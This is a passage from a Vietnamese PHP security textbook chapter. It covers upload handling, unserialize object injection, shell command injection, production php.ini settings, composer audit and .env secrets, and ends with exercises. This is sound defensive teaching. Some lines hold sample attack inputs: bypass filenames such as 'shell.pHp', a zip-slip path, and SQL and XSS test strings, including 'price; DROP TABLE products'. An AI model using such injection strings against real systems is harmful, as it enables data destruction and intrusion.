}

// Trong web: $name = storeAvatar($_FILES['avatar'], '/var/app/storage/avatars');  // thư mục NGOÀI web root
// Chạy từ CLI thì không có file upload thật, nên hàm dừng ở bước is_uploaded_file:
$fake = ['name' => 'a.png', 'type' => 'image/png', 'tmp_name' => __FILE__, 'error' => UPLOAD_ERR_OK, 'size' => 10];
try {
    storeAvatar($fake, sys_get_temp_dir());
} catch (RuntimeException $e) {
    echo $e->getMessage(), "\n";        // in ra: Không phải file upload
}
```

Giải thích từng lớp và những gì hàm trên chưa làm:

- `is_uploaded_file`/`move_uploaded_file` chỉ chấp nhận file thật sự được upload qua HTTP POST trong
  request hiện tại, nên kẻ tấn công không lừa được hàm di chuyển một file hệ thống (`/etc/passwd`) bằng
  cách sửa `tmp_name`.
- Kích thước: giới hạn ở ba tầng: `upload_max_filesize` và `post_max_size` trong `php.ini`, giới hạn body
  của web server, và kiểm lại trong code theo nghiệp vụ.
- Allowlist MIME ánh xạ sang đuôi file **do server chọn**. Không bao giờ giữ đuôi từ tên client gửi
  (`avatar.jpg.php`, `shell.pHp`, `.phtml` đều là cách lách denylist).
- Chặn ảnh có kích thước pixel khổng lồ: file nhỏ nhưng giải nén ra hàng chục nghìn pixel mỗi chiều làm
  hết bộ nhớ khi resize.
- Lưu **ngoài web root** (hoặc lên object storage như S3), rồi phục vụ qua một script kiểm quyền và gửi
  header `Content-Type` đúng, `X-Content-Type-Options: nosniff`, và `Content-Disposition: attachment` với
  file không cần hiển thị trực tiếp.
- Cấu hình web server **không** chạy PHP trong thư mục upload; với Nginx, chỉ chuyển cho PHP-FPM đúng file
  `index.php` ([Chương 18](18-fpm-nginx-opcache.md)).
- Muốn loại bỏ dữ liệu lạ nhét trong ảnh: mở ảnh bằng thư viện ảnh (GD, Imagick) rồi ghi lại thành file
  mới (*re-encode*); phần nối thêm như ví dụ polyglot sẽ bị bỏ.
- ⚠️ SVG là XML và chứa được `<script>`: mở trực tiếp trên domain của bạn là stored XSS. Không nhận SVG,
  hoặc chỉ phục vụ nó dạng attachment, hoặc từ một domain riêng cho nội dung người dùng.
- ⚠️ File nén (zip) có thể chứa entry tên `../../app/config.php` (*zip slip*) và có thể là *zip bomb* (vài
  KB giải ra hàng GB). Kiểm tên từng entry như mục 9.1 và giới hạn tổng dung lượng **trong lúc** giải nén.

## 10. `unserialize` và object injection

### 10.1 Vấn đề

[Chương 10](10-oop-nang-cao.md) mục 11 đã giới thiệu: chuỗi `serialize` của một object **ghi tên class**
và giá trị property, nên `unserialize()` dựng lại object của đúng class đó. Nếu chuỗi đến từ người dùng
(cookie, tham số, file upload), thì người dùng quyết định class nào được tạo và property mang giá trị gì.
Kết hợp với các *magic method* chạy tự động (`__unserialize`/`__wakeup` ngay khi dựng, `__destruct` khi
object bị huỷ, `__toString` khi bị dùng như chuỗi), code có sẵn trong app hoặc trong `vendor/` có thể bị
kích hoạt với dữ liệu do người ngoài chọn. Lớp lỗ hổng này gọi là *object injection* (OWASP xếp vào
*insecure deserialization*); hậu quả có thể tới mức chạy code tuỳ ý trên server.

Điểm mấu chốt: lỗ hổng nằm ở **việc unserialize dữ liệu không tin cậy**, không nằm ở một class "xấu" cụ
thể nào. Đừng cố vá từng class; hãy loại bỏ chính lời gọi `unserialize` trên input.

### 10.2 `allowed_classes` và `max_depth`

```php
unserialize(string $data, array $options = []): mixed
```

| Option | Ý nghĩa |
|---|---|
| `allowed_classes` | `false`: không dựng object nào, mọi object thành `__PHP_Incomplete_Class`. Mảng tên class: chỉ dựng các class đó. Bỏ trống tương đương `true`: dựng mọi class. Không áp dụng cho enum |
| `max_depth` (7.4) | Giới hạn độ sâu lồng nhau để chống tràn stack; mặc định 4096, `0` là tắt giới hạn |

```php
<?php
declare(strict_types=1);

final class Money
{
    public function __construct(public int $amount = 0) {}
}

$s = serialize(new Money(500));
echo $s, "\n";                                                    // in ra: O:5:"Money":1:{s:6:"amount";i:500;}
var_dump(get_class(unserialize($s, ['allowed_classes' => false])));          // in ra: string(22) "__PHP_Incomplete_Class"
var_dump(get_class(unserialize($s, ['allowed_classes' => [Money::class]]))); // in ra: string(5) "Money"

try {
    unserialize($s, ['allowed_classes' => 'Money']);              // sai kiểu: phải là bool hoặc mảng
} catch (TypeError $e) {
    echo get_class($e), "\n";                                     // in ra: TypeError (đã thử 8.3 và 8.5)
}
```

⚠️ Manual PHP cảnh báo: **không đưa input không tin cậy vào `unserialize()` bất kể giá trị
`allowed_classes`**, vì việc dựng object và autoload vẫn có thể dẫn tới chạy code. `allowed_classes`
giảm rủi ro, không biến việc đó thành an toàn. Về kiểu của option: truyền giá trị không phải bool hay
mảng (như chuỗi `'Money'` ở trên) đã ném `TypeError` từ PHP 8.0; từ PHP 8.4, mảng chứa phần tử không phải
tên class hợp lệ (ví dụ `[1]`) cũng ném `TypeError`/`ValueError`, trước đó bị bỏ qua.

### 10.3 Cách làm đúng

1. Dữ liệu đi qua tay người dùng dùng **JSON** (`json_encode`/`json_decode`): JSON chỉ dựng lại mảng và giá
   trị vô hướng, không tạo object của class tuỳ ý. Cần object thì tự dựng từ mảng sau khi validate.
2. Dữ liệu do chính bạn serialize nhưng lưu ở nơi người khác có thể chạm (cookie, cache dùng chung): ký
   bằng `hash_hmac` khi ghi, và kiểm chữ ký bằng `hash_equals` **trước** khi unserialize (mục 6.4). Kiểm sau
   là quá muộn: magic method đã chạy.
3. Vẫn truyền `allowed_classes` với danh sách tối thiểu, như lớp phòng thủ thêm.
4. Không để người dùng điều khiển đầy đủ đường dẫn file: trước PHP 8.0, các hàm thao tác file chạy trên
   đường dẫn `phar://` có thể tự unserialize metadata của file phar. PHP 8.0 đã bỏ hành vi tự unserialize
   này (RFC *phar_stop_autoloading_metadata*), nhưng nguyên tắc mục 9.1 vẫn giữ nguyên.

Liên hệ Laravel: `encrypt()` mặc định serialize giá trị trước khi mã hoá, và nếu `APP_KEY` bị lộ thì kẻ
tấn công tạo được dữ liệu mã hoá hợp lệ. Vì vậy lộ `APP_KEY` nghiêm trọng hơn "chỉ lộ dữ liệu" (mục 14).
Đối chiếu: Java `ObjectInputStream`, Python `pickle` có cùng bản chất; bài học chung là định dạng
serialize gốc của ngôn ngữ không dùng cho dữ liệu không tin cậy.

## 11. Command injection và `escapeshellarg`

### 11.1 Cơ chế

`exec()`, `shell_exec()`, `system()`, `passthru()` và `proc_open()` với chuỗi lệnh đều đưa chuỗi đó cho
shell (`/bin/sh -c ...`) parse. Shell hiểu `;`, `|`, `&`, `$(...)`, dấu backtick, `>` là cú pháp. Nối input
vào chuỗi lệnh thì input có thể thêm lệnh thứ hai: cùng lỗi gốc với SQL injection, chỉ khác "trình thông
dịch" là shell. (Toán tử backtick của PHP, alias của `shell_exec`, bị deprecated từ PHP 8.5.)

### 11.2 Cách phòng, theo thứ tự ưu tiên

1. **Không gọi shell.** Gần như mọi việc đều có hàm PHP hoặc thư viện: `mkdir()`, `copy()`, `unlink()`,
   GD/Imagick thay cho lệnh `convert`, `ZipArchive` thay `zip`.
2. **Truyền mảng tham số, không qua shell.** Từ PHP 7.4, `proc_open()` nhận lệnh dạng mảng: chương trình
   được chạy trực tiếp, mỗi phần tử là một tham số, không có shell nào parse. Symfony Process
   (`new Process(['cmd', $arg])`) làm tương tự.
3. Buộc phải dùng chuỗi lệnh: bọc **từng** tham số bằng `escapeshellarg()`. Trên Linux, hàm này đặt giá trị
   trong nháy đơn và xử lý dấu nháy đơn bên trong, nên cả giá trị luôn là một tham số duy nhất.

```php
<?php
declare(strict_types=1);

$file = "bao cao; ngay 1.txt";                  // tên file có dấu cách và dấu chấm phẩy

echo 'wc -c ' . escapeshellarg($file), "\n";    // in ra: wc -c 'bao cao; ngay 1.txt'
echo escapeshellarg("it's"), "\n";              // in ra: 'it'\''s'

// Cách tốt hơn: mảng tham số, không có shell ở giữa
$proc = proc_open(['echo', 'xin chao', $file], [1 => ['pipe', 'w']], $pipes);
if (is_resource($proc)) {
    echo stream_get_contents($pipes[1]);         // in ra: xin chao bao cao; ngay 1.txt
    fclose($pipes[1]);
    proc_close($proc);
}
```

⚠️ Hai bẫy còn lại:

- `escapeshellcmd()` **không** dùng cho input người dùng: nó escape ký tự đặc biệt trong cả chuỗi lệnh,
  nhưng không ngăn input thêm tham số mới.
- *Argument injection*: kể cả khi đã escape hoặc dùng mảng, một giá trị bắt đầu bằng `-` vẫn bị chương
  trình hiểu là *option*. Validate giá trị bằng allowlist/regex, và đặt `--` trước tham số người dùng (quy
  ước POSIX: mọi thứ sau `--` là đối số, không phải option) với chương trình hỗ trợ quy ước này.

Lớp cuối là cấu hình: `disable_functions` có thể vô hiệu các hàm chạy lệnh nếu app không cần (mục 12).

## 12. Cấu hình PHP an toàn cho production

### 12.1 Các directive quan trọng

PHP có hai file mẫu trong mã nguồn: `php.ini-development` và `php.ini-production`. Production nên bắt đầu
từ bản `-production`, rồi chỉnh thêm. Bảng dưới ghi giá trị trong `php.ini-production` của PHP 8.5 và giá
trị nên dùng:

| Directive | Trong `php.ini-production` | Nên đặt | Vì sao |
|---|---|---|---|
| `display_errors` | `Off` | `Off` | Thông báo lỗi lộ đường dẫn, câu SQL, cấu trúc code |
| `display_startup_errors` | `Off` | `Off` | Như trên, cho lỗi lúc khởi động |
| `log_errors` | `On` | `On`, ghi ra file ngoài web root hoặc stderr | Lỗi vẫn phải được ghi lại để bạn đọc |
| `expose_php` | `On` | `Off` | Bật thì PHP gửi header `X-Powered-By: PHP/8.x.y`, lộ phiên bản |
| `allow_url_fopen` | `On` | `Off` nếu app không cần đọc URL bằng hàm file | Thu hẹp đường tấn công khi có LFI/SSRF; HTTP client thì dùng cURL/Guzzle |
| `allow_url_include` | `Off` | `Off` | Chặn RFI (mục 9.2) |
| `open_basedir` | không đặt | Thư mục app và thư mục tạm | Giới hạn file PHP được mở |
| `disable_functions` | rỗng | Các hàm chạy lệnh nếu app không cần | Giảm thiệt hại nếu có lỗ hổng chạy code |
| `zend.exception_ignore_args` | `On` | `On` | Stack trace không chứa giá trị tham số |
| `session.use_strict_mode` | `0` | `1` | Manual gọi việc bật là bắt buộc cho an toàn session |
| `session.cookie_httponly`, `cookie_secure`, `cookie_samesite` | rỗng | `1`, `1`, `"Lax"` | Mục 3.5, 4.4, [Chương 15](15-php-va-web.md) |

Kiểm cấu hình đang chạy bằng `php -i` (CLI) hoặc `ini_get()`; nhớ rằng PHP-FPM và CLI thường đọc **hai
file `php.ini` khác nhau** ([Chương 18](18-fpm-nginx-opcache.md)).

### 12.2 Hiểu đúng giới hạn của từng directive

- `display_errors = Off` không có nghĩa là bỏ qua lỗi: lỗi vẫn được ghi log. Trang lỗi cho người dùng nên
  là một thông báo chung kèm mã tham chiếu để tra log.
- `open_basedir`: manual ghi đây là tên thư mục, không phải tiền tố; symlink được giải trước khi kiểm.
  Script chỉ có thể **thu hẹp** nó lúc chạy bằng `ini_set()`, không nới rộng được; từ PHP 8.3, giá trị đặt
  lúc chạy không được chứa `..`. Bật `open_basedir` sẽ tắt *realpath cache*, có ảnh hưởng hiệu năng. Đây
  là lớp phòng thủ chiều sâu, không thay cho việc validate đường dẫn (mục 9.1).
- `disable_functions`: chỉ đặt được trong `php.ini` (không đổi bằng `ini_set`), chỉ áp dụng cho hàm nội
  bộ. Từ PHP 8.0, hàm bị tắt bị gỡ hẳn khỏi bảng hàm, nên gọi nó là lỗi "Call to undefined function".
  Đây không phải sandbox: đừng coi nó là cách cho chạy code không tin cậy. Directive `disable_classes` đã
  bị gỡ bỏ ở PHP 8.5.
- Giữ PHP ở phiên bản còn được hỗ trợ bản vá bảo mật. Mỗi nhánh PHP có thời hạn hỗ trợ; xem lịch ở
  php.net/supported-versions.

Ở tầng Laravel, tương đương của `display_errors` là `APP_DEBUG`: production bắt buộc `APP_DEBUG=false`,
vì trang lỗi debug hiển thị stack trace và chi tiết request ([Chương 23](23-laravel-gioi-thieu.md)).

## 13. Dependency và supply chain: `composer audit`

### 13.1 Code của người khác cũng là code của bạn

Một app Laravel bình thường có hàng chục tới hàng trăm package trong `vendor/`. Lỗ hổng trong bất kỳ
package nào cũng là lỗ hổng của app. *Supply chain attack* (tấn công chuỗi cung ứng) là khi kẻ tấn công
không đánh vào code của bạn mà vào thứ bạn cài: một package bị chiếm tài khoản maintainer và phát hành
bản độc, một package mới có tên gần giống package phổ biến (*typosquatting*).

### 13.2 `composer audit`

`composer audit` đối chiếu các package đã cài với cơ sở dữ liệu *security advisory* (mặc định qua API của
Packagist), và còn báo package bị bỏ rơi (*abandoned*); từ Composer 2.10 báo cả package bị gắn cờ malware.
Exit code: `0` nếu không có vấn đề, khác `0` nếu tìm thấy (Composer 2.10 trả `1`; bản 2.9 trả `1` cho lỗ
hổng, `2` cho abandoned, `3` cho cả hai), nên cắm thẳng được vào CI:

```bash
# Chạy ở thư mục gốc dự án (nơi có composer.json, composer.lock)
composer audit                       # bảng kết quả dễ đọc
composer audit --locked              # kiểm theo composer.lock, không cần thư mục vendor
composer audit --no-dev              # bỏ qua require-dev
composer audit --format=json         # cho công cụ khác đọc
```

Ngoài lệnh `audit`, Composer tự in báo cáo rút gọn sau `update`/`require`. Từ Composer 2.9, các lệnh
`update`/`require`/`remove` mặc định **chặn** phiên bản dính security advisory ngay lúc giải dependency
(khoá `config.audit.block-insecure`, mặc định `true`). Composer 2.10 gom các cấu hình này vào khối
`config.policy` (ví dụ `policy.advisories.block`, mặc định `true`) và đánh dấu các khoá `config.audit` cũ
là deprecated (vẫn được đọc nếu thiếu khối `policy` tương ứng). Tra tài liệu đúng phiên bản Composer bạn
dùng trước khi cấu hình.

### 13.3 Thói quen an toàn với dependency

- **Commit `composer.lock`** cho ứng dụng, và deploy bằng `composer install` (đọc lock, cài đúng phiên bản
  đã kiểm), không bằng `composer update`. Production: `composer install --no-dev` để không cài công cụ dev
  ([Chương 11](11-namespace-composer.md)).
- Chạy `composer audit` trong CI, và định kỳ (advisory mới xuất hiện cả khi code không đổi).
- Trước khi thêm package: xem ai maintain, còn được cập nhật không, có bao nhiêu người dùng. Ít dependency
  hơn là ít bề mặt tấn công hơn.
- Cẩn thận với Composer *plugin* và *script* (`post-install-cmd`...): chúng chạy code lúc cài đặt. Composer
  hỏi trước khi cho plugin chạy (`config.allow-plugins`); đừng cho phép tất cả.
- Không đặt thư mục `vendor/` (hay cả thư mục dự án) trong web root: chỉ `public/` được phục vụ.

## 14. Secret và `.env`

### 14.1 Secret là gì và không được để ở đâu

*Secret* là mọi giá trị mà ai có được nó sẽ có quyền: mật khẩu DB, khoá API của cổng thanh toán, khoá mã
hoá (mục 8.4), `APP_KEY` của Laravel, secret ký webhook. Quy tắc:

- Không hardcode trong code, không commit vào git. Lịch sử git giữ mãi: xoá ở commit sau không xoá được
  ở commit trước. Secret đã lỡ commit thì coi như đã lộ và phải **đổi** (*rotate*), không chỉ xoá.
- Không gửi xuống client (HTML, JavaScript, app mobile): mọi thứ ở client đều đọc được.
- Không ghi vào log, không in trong trang lỗi.

### 14.2 Biến môi trường và file `.env`

Cách phổ biến: secret được đưa vào process qua *biến môi trường* (*environment variable*), code đọc bằng
`getenv('DB_PASSWORD')` hoặc `$_ENV`/`$_SERVER` (tuỳ `variables_order` trong `php.ini`). Trên máy dev, việc
đặt hàng chục biến môi trường bằng tay bất tiện, nên người ta ghi chúng vào file `.env` và dùng thư viện
(như `vlucas/phpdotenv`, thứ Laravel dùng) để nạp lúc khởi động.

```
# .env  (KHÔNG commit)                 # .env.example  (commit, không có giá trị thật)
APP_ENV=production                     APP_ENV=local
APP_DEBUG=false                        APP_DEBUG=true
DB_PASSWORD=...giá trị thật...         DB_PASSWORD=
PAYMENT_WEBHOOK_SECRET=...             PAYMENT_WEBHOOK_SECRET=
```

Những điều cần làm đúng:

- `.env` nằm trong `.gitignore`; commit `.env.example` liệt kê tên biến để người khác biết cần đặt gì.
- `.env` nằm **ngoài** web root. Cấu trúc Laravel đặt web root ở `public/`, còn `.env` ở thư mục gốc dự án,
  nên web server không phục vụ được nó. Cấu hình web server trỏ nhầm web root vào thư mục gốc dự án là
  một lỗi kinh điển làm lộ `.env`.
- Quyền file chặt: chỉ user chạy app đọc được.
- Trên production, cân nhắc không dùng file `.env` mà để nền tảng triển khai (container orchestrator,
  dịch vụ cloud) bơm biến môi trường, hoặc dùng *secret manager* (AWS Secrets Manager, HashiCorp Vault...)
  để có kiểm soát truy cập, nhật ký và xoay vòng.
- ⚠️ `phpinfo()` in toàn bộ biến môi trường. Không để trang gọi `phpinfo()` trên production.

Với Laravel: chỉ gọi `env()` trong các file `config/*.php`; trong code còn lại dùng `config()`. Khi chạy
`php artisan config:cache` (nên làm khi deploy), file `.env` không được nạp nữa và `env()` gọi ngoài file
config sẽ trả `null`.

### 14.3 Khi secret bị lộ

1. Đổi secret ngay (sinh giá trị mới, cập nhật mọi nơi dùng), rồi vô hiệu giá trị cũ.
2. Đánh giá phạm vi: secret đó cho phép làm gì, từ lúc nào, nhật ký truy cập có gì bất thường.
3. Với `APP_KEY` của Laravel: khoá này mã hoá cookie, session, dữ liệu `encrypt()` và ký signed URL. Lộ nó
   thì kẻ tấn công **giả mạo** được dữ liệu mã hoá hợp lệ, không chỉ đọc; khi dữ liệu đó được unserialize
   thì có thể dẫn tới chạy code (mục 10). Laravel 13 giảm rủi ro này: file `config/session.php` của bộ
   khung app mới đặt sẵn `'serialization' => 'json'` (session lưu dạng JSON). ⚠️ App nâng cấp từ bản cũ mà
   config không có khoá này thì framework vẫn dùng mặc định `'php'` (serialize của PHP). Xoay khoá bằng `php artisan key:generate` và đưa khoá cũ vào `APP_PREVIOUS_KEYS` để dữ liệu cũ
   vẫn giải mã được trong giai đoạn chuyển ([Chương 28](28-laravel-auth.md)).

## Lỗi thường gặp

| Lỗi | Vì sao nguy hiểm | Cách tránh |
|---|---|---|
| Nối input vào câu SQL | SQL injection (2.1) | Prepared statement; allowlist cho tên cột, `ORDER BY` (2.3) |
| Đổi charset bằng `SET NAMES` với PDO_MYSQL | Escape giả lập dùng sai charset (2.2) | `charset=utf8mb4` trong DSN |
| `echo $input` ra HTML | XSS (3.1) | `htmlspecialchars($s, ENT_QUOTES \| ENT_SUBSTITUTE, 'UTF-8')` khi in |
| Thuộc tính HTML không có nháy | Escape vô dụng (3.3) | Luôn đặt giá trị thuộc tính trong nháy |
| Escape HTML cho dữ liệu trong `<script>` | Sai ngữ cảnh (3.3) | `json_encode` với cờ `JSON_HEX_*` |
| Tin `FILTER_VALIDATE_URL` cho link người dùng | Chấp nhận `javascript:` (1.3, 3.4) | Allowlist scheme `http`/`https` |
| Dùng `strip_tags` để chống XSS | Giữ nguyên thuộc tính sự kiện (3.4) | Escape, hoặc sanitizer như HTML Purifier |
| Đổi dữ liệu bằng request GET | CSRF qua thẻ ảnh, link (4.2) | GET chỉ đọc |
| Form không có CSRF token | CSRF (4.3) | Token theo session, so bằng `hash_equals` |
| `md5`/`sha1`/`sha256` cho mật khẩu | Bẻ offline rất nhanh (5.1) | `password_hash` |
| So mật khẩu bằng `password_hash(...) === $hash` | Salt mới mỗi lần nên luôn sai (5.3) | `password_verify` |
| Không rehash khi đổi cost | Hash cũ yếu mãi (5.4) | `password_needs_rehash` lúc đăng nhập |
| Mật khẩu dài hơn 72 byte với bcrypt | Bị cắt ngầm (5.6) | Giới hạn độ dài, hoặc Argon2id |
| Token bằng `rand`, `mt_rand`, `uniqid`, `md5(time())` | Đoán được (6.1) | `random_bytes`, `random_int` |
| So token/chữ ký bằng `==` hoặc `===` | Type juggling (7), timing (6.3) | `is_string` + `hash_equals` |
| `hash('sha256', $secret . $data)` làm chữ ký | Length extension (6.4) | `hash_hmac` |
| Tự ghép `openssl_encrypt` không MAC | Ciphertext bị sửa được (8.2) | sodium AEAD |
| Lưu khoá mã hoá trong DB | Lộ DB là lộ cả khoá (8.4) | Khoá ở secret manager/biến môi trường |
| Ghép input vào đường dẫn file | Path traversal (9.1) | Lưu theo ID; `basename` + `realpath` |
| `include $_GET['page']` | LFI, đọc source (9.2) | Allowlist trang |
| Giữ tên và đuôi file client gửi | Upload chạy được như PHP (9.3) | Tên và đuôi do server sinh, lưu ngoài web root |
| `unserialize` dữ liệu người dùng | Object injection (10) | JSON; HMAC trước khi unserialize |
| Nối input vào lệnh shell | Command injection (11) | Không gọi shell; `proc_open` dạng mảng; `escapeshellarg` |
| `display_errors=On`, `APP_DEBUG=true` trên production | Lộ thông tin (12) | Tắt, ghi log |
| Không chạy `composer audit` | Dùng package có lỗ hổng đã biết (13) | Audit trong CI |
| Commit `.env` | Lộ secret vĩnh viễn trong lịch sử git (14) | `.gitignore`; lỡ commit thì rotate |

## Tóm tắt chương

- Mọi dữ liệu từ bên ngoài (request, header, cookie, file, cả dữ liệu đọc từ DB) đều không tin cậy.
  Validate lúc nhận, escape đúng ngữ cảnh lúc xuất; ưu tiên allowlist.
- SQL injection: prepared statement cho giá trị, allowlist cho tên cột và cú pháp. XSS: `htmlspecialchars`
  cho HTML và thuộc tính có nháy, `json_encode` với `JSON_HEX_*` cho script, kiểm scheme cho URL. Từ PHP
  8.1, flag mặc định của `htmlspecialchars` là `ENT_QUOTES | ENT_SUBSTITUTE | ENT_HTML401`.
- CSRF: GET không đổi trạng thái; token ngẫu nhiên theo session so bằng `hash_equals`; `SameSite`,
  `Origin`/`Sec-Fetch-Site` là lớp bổ sung. Có XSS thì mọi biện pháp chống CSRF bị vô hiệu.
- Mật khẩu: `password_hash` (bcrypt, cost mặc định 12 từ PHP 8.4; hoặc Argon2id), `password_verify`,
  `password_needs_rehash` lúc đăng nhập; nhớ giới hạn 72 byte của bcrypt và hash giả để chống dò email.
- Bí mật: sinh bằng `random_bytes`/`random_int`, so bằng `hash_equals`, ký bằng `hash_hmac`. `==` để lọt
  magic hash và JSON `true`; PHP 8 không sửa ca hai numeric string.
- Mã hoá dữ liệu cần đọc lại bằng sodium AEAD (XChaCha20-Poly1305), nonce mới mỗi lần, khoá ngoài DB.
- File: không ghép input vào đường dẫn hay `include`; upload đặt tên và đuôi do server sinh, lưu ngoài web
  root, không bao giờ cho chạy như PHP.
- Không `unserialize` input người dùng (kể cả có `allowed_classes`); không nối input vào lệnh shell.
- Production: `display_errors=Off`, `expose_php=Off`, `allow_url_include=Off`, session strict mode;
  `composer audit` trong CI; secret ngoài git, lộ thì rotate.

## Câu hỏi tự kiểm tra

1. Vì sao "làm sạch input một lần lúc nhận" không thay được việc escape lúc xuất? Cho ví dụ một chuỗi cần
   được mã hoá khác nhau ở ba đích đến. (1.3)
2. Prepared statement chặn SQL injection bằng cơ chế nào? Kể hai chỗ trong câu SQL mà placeholder không
   dùng được và cách xử lý. (2.2, 2.3)
3. Cùng một lời gọi `htmlspecialchars($s)` cho kết quả khác nhau thế nào giữa PHP 8.0 và 8.1? Vì sao nên
   luôn truyền đủ tham số? (3.2)
4. Một trang có `<a href="<?= e($user['website']) ?>">`. Hàm `e()` escape đúng, vậy còn lỗ hổng gì? (3.4)
5. `SameSite=Lax` chặn được kịch bản CSRF nào, và không chặn được kịch bản nào? (4.4)
6. Tại sao lưu mật khẩu bằng SHA-256 có salt vẫn là sai? `password_needs_rehash` giải quyết vấn đề gì, và
   vì sao chỉ gọi được lúc đăng nhập? (5.1, 5.4)
7. Tại sao hash giả dùng khi email không tồn tại phải là hash hợp lệ cùng cost? (5.6)
8. Giải thích vì sao `md5('240610708') == md5('QNKCDZO')` là `true` trên cả PHP 8, và vì sao JSON
   `{"api_key": true}` qua được `$data['api_key'] == $key`. (7.2, 7.3)
9. Associated data trong AEAD dùng để làm gì? Vì sao cùng một plaintext mã hoá hai lần ra hai ciphertext
   khác nhau, và hệ quả với việc tìm kiếm? (8.3, 8.4)
10. File upload đã qua `finfo` và `getimagesize` có còn nguy hiểm không? Lớp phòng thủ nào là quyết định?
    (9.3)

## Bài tập

1. **Tìm kiếm sản phẩm an toàn.** Dùng `pdo_sqlite` trong bộ nhớ, tạo bảng `products` với vài dòng. Viết
   một script nhận `q` (tìm theo tên, xử lý đúng `%` và `_`), `sort` (một trong `name`, `price`) và `dir`
   (`asc`/`desc`), in kết quả ra HTML. Yêu cầu: không có SQL injection, không có XSS, input sai thì rơi
   về mặc định. Tự thử với input `x' OR '1'='1`, `<script>alert(1)</script>` và `price; DROP TABLE products`.
2. **Đăng ký và đăng nhập.** Viết lớp `UserStore` lưu user trong một mảng (hoặc SQLite) với các method
   `register(string $email, string $password)` và `login(string $email, string $password): bool`. Yêu cầu:
   `password_hash`, kiểm độ dài tối đa 72 byte, rehash khi cost thay đổi (thử bằng cách tạo user với cost
   10 rồi đăng nhập), hash giả khi email không tồn tại. Đo thời gian ba trường hợp (email không có, sai mật
   khẩu, đúng mật khẩu) bằng `hrtime()` và nhận xét.
3. **Link đặt lại mật khẩu.** Viết hai hàm: `issueResetToken(int $userId): string` sinh token bằng
   `random_bytes`, chỉ lưu SHA-256 của token kèm thời điểm hết hạn (15 phút); và
   `consumeResetToken(string $token): ?int` trả user ID nếu token đúng và chưa hết hạn, rồi xoá token
   (dùng một lần). Kiểm `is_string`/định dạng token trước khi dùng.
4. **Cookie có chữ ký.** Viết `signCookie(array $data, string $key): string` và
   `readCookie(string $cookie, string $key): ?array` lưu dữ liệu dạng JSON kèm HMAC-SHA256, kiểm bằng
   `hash_equals` trước khi `json_decode`. Thử sửa một ký tự trong cookie và thử gửi một chữ ký rỗng; giải
   thích vì sao không dùng `serialize` ở đây.

## Đọc thêm

- PHP Manual: [Security](https://www.php.net/manual/en/security.php),
  [htmlspecialchars](https://www.php.net/manual/en/function.htmlspecialchars.php),
  [password_hash](https://www.php.net/manual/en/function.password-hash.php),
  [password_verify](https://www.php.net/manual/en/function.password-verify.php),
  [Password constants](https://www.php.net/manual/en/password.constants.php),
  [random_bytes](https://www.php.net/manual/en/function.random-bytes.php),
  [mt_rand](https://www.php.net/manual/en/function.mt-rand.php),
  [uniqid](https://www.php.net/manual/en/function.uniqid.php),
  [hash_equals](https://www.php.net/manual/en/function.hash-equals.php),
  [unserialize](https://www.php.net/manual/en/function.unserialize.php),
  [Sodium](https://www.php.net/manual/en/book.sodium.php),
  [sodium_crypto_aead_xchacha20poly1305_ietf_encrypt](https://www.php.net/manual/en/function.sodium-crypto-aead-xchacha20poly1305-ietf-encrypt.php),
  [PDO prepared statements](https://www.php.net/manual/en/pdo.prepared-statements.php),
  [PDO_MYSQL](https://www.php.net/manual/en/ref.pdo-mysql.php),
  [MySQL character sets](https://www.php.net/manual/en/mysqlinfo.concepts.charset.php),
  [php:// wrappers](https://www.php.net/manual/en/wrappers.php.php),
  [Core php.ini directives](https://www.php.net/manual/en/ini.core.php),
  [Session configuration](https://www.php.net/manual/en/session.configuration.php),
  [escapeshellarg](https://www.php.net/manual/en/function.escapeshellarg.php)
- php-src: [UPGRADING 8.4](https://github.com/php/php-src/blob/PHP-8.4/UPGRADING),
  [UPGRADING 8.5](https://github.com/php/php-src/blob/PHP-8.5/UPGRADING),
  [php.ini-production](https://github.com/php/php-src/blob/PHP-8.5/php.ini-production),
  RFC [bcrypt_cost_2023](https://wiki.php.net/rfc/bcrypt_cost_2023)
- OWASP Cheat Sheets: [Password Storage](https://cheatsheetseries.owasp.org/cheatsheets/Password_Storage_Cheat_Sheet.html),
  [SQL Injection Prevention](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html),
  [XSS Prevention](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html),
  [CSRF Prevention](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html),
  [File Upload](https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html),
  [Deserialization](https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html),
  [OS Command Injection Defense](https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html),
  [PHP Configuration](https://cheatsheetseries.owasp.org/cheatsheets/PHP_Configuration_Cheat_Sheet.html)
- Laravel 13: [CSRF Protection](https://laravel.com/docs/13.x/csrf),
  [Encryption](https://laravel.com/docs/13.x/encryption), [Hashing](https://laravel.com/docs/13.x/hashing)
- Composer: [CLI `audit`](https://getcomposer.org/doc/03-cli.md#audit),
  [Config](https://getcomposer.org/doc/06-config.md)
- libsodium documentation: [AEAD XChaCha20-Poly1305](https://doc.libsodium.org/secret-key_cryptography/aead/chacha20-poly1305/xchacha20-poly1305_construction)
